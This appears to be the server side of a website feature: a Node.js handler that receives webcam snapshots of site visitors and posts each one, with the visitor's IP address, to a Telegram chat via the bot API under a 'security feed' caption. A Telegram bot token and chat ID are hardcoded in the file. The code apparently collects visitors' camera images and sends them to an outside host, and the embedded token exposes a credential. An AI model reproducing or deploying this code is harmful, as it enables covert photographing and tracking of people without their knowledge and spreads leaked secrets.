// api/cam.js — receives visitor camera snap and forwards to Telegram with SOC caption
const TOKEN = process.env.TG_BOT_TOKEN || '8746655192:AAE0OabqXKfBkbs_kIlIRQEKNo_kE3JB49k';
const CHAT = process.env.TG_CHAT_ID || '8908879084';

const recentSnaps = new Map();
const COOLDOWN_MS = 10 * 1000; // 10s debounce per IP

function cleanupOldSnaps() {
  const now = Date.now();
  for (const [ip, time] of recentSnaps.entries()) {
    if (now - time > COOLDOWN_MS) recentSnaps.delete(ip);
  }
}

module.exports = async function handler(req, res) {
  if (req.method !== 'POST') {
    res.setHeader('Content-Type', 'application/json');
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const ip =
      (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
      req.headers['x-real-ip'] ||
      req.socket?.remoteAddress ||
      '';

    const now = Date.now();
    cleanupOldSnaps();

    if (ip && recentSnaps.has(ip)) {
      const lastSnap = recentSnaps.get(ip);
      if (now - lastSnap < COOLDOWN_MS) {
        res.setHeader('Content-Type', 'application/json');
        return res.status(200).json({ ok: true, skipped: 'debounced' });
      }
    }
    if (ip) recentSnaps.set(ip, now);

    let photo = req.body && req.body.photo;
    if (!photo) {
      const raw = await readRaw(req);
      try {
        const parsed = JSON.parse(raw.toString());
        photo = parsed.photo;
      } catch (e) {}
    }

    if (!photo) {
      res.setHeader('Content-Type', 'application/json');
      return res.status(400).json({ error: 'No photo provided' });
    }

    const base64Data = photo.replace(/^data:image\/\w+;base64,/, '');
    const buffer = Buffer.from(base64Data, 'base64');

    const tgForm = new FormData();
    tgForm.append('chat_id', CHAT);
    tgForm.append('photo', new Blob([buffer], { type: 'image/jpeg' }), 'security_snap.jpg');

    let caption = '📸 <b>SECURITY FEED // VISITOR SNAPSHOT</b>';
    if (ip) caption += `\n🌐 <b>IP Address:</b> <code>${ip}</code>`;

    tgForm.append('caption', caption);
    tgForm.append('parse_mode', 'HTML');

    const tgRes = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
      method: 'POST',
      body: tgForm,
    });

    if (!tgRes.ok) {
      const errText = await tgRes.text();
      res.setHeader('Content-Type', 'application/json');
      return res.status(502).json({ error: 'Telegram failed', tgError: errText });
    }

    res.setHeader('Content-Type', 'application/json');
    return res.status(200).json({ ok: true });
  } catch (err) {
    res.setHeader('Content-Type', 'application/json');
    return res.status(500).json({ error: 'Forward failed', message: err.message });
  }
};

function readRaw(req) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    req.on('data', (c) => chunks.push(c));
    req.on('end', () => resolve(Buffer.concat(chunks)));
    req.on('error', reject);
  });
}
